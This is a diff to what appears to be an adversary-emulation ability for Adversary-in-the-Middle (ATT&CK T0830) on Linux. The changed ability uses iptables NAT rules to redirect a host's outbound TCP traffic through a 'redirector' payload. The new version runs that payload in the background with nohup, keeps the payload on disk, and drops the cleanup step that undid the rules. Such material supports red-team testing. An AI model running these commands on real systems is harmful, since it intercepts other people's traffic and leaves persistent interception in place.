@@ -19,22 +19,13 @@
     attack_id: T0830
     name: Adversary-in-the-Middle
   repeatable: false
+  delete_payload: false
   platforms:
     linux:
       sh:
         command: |
-          iptables -A INPUT -p tcp --dport #{redirector.local.port} -j ACCEPT
-          iptables -t nat -A OUTPUT -d #{redirector.remote.ip}/32 -p tcp \
-            --dport #{redirector.remote.port} -m mark ! --mark 45 -j REDIRECT \
-            --to-port #{redirector.local.port}
-
-          redirector :#{redirector.local.port}:#{redirector.remote.ip}:#{redirector.remote.port}
-        cleanup: |
-          pkill redirector
-
-          iptables -t nat -D OUTPUT -d #{redirector.remote.ip}/32 -p tcp \
-            --dport #{redirector.remote.port} -m mark ! --mark 45 -j REDIRECT \
-            --to-port #{redirector.local.port}
-          iptables -D INPUT -p tcp --dport #{redirector.local.port} -j ACCEPT
+          iptables -A INPUT -p tcp --dport #{redirector.local.port} -j ACCEPT;
+          iptables -t nat -A OUTPUT -d #{redirector.remote.ip}/32 -p tcp --dport #{redirector.remote.port} -m mark ! --mark 45 -j REDIRECT --to-port #{redirector.local.port};
+          nohup ./redirector :#{redirector.local.port}:#{redirector.remote.ip}:#{redirector.remote.port} > /tmp/redirector.log 2>&1 &
         payloads:
         - redirector
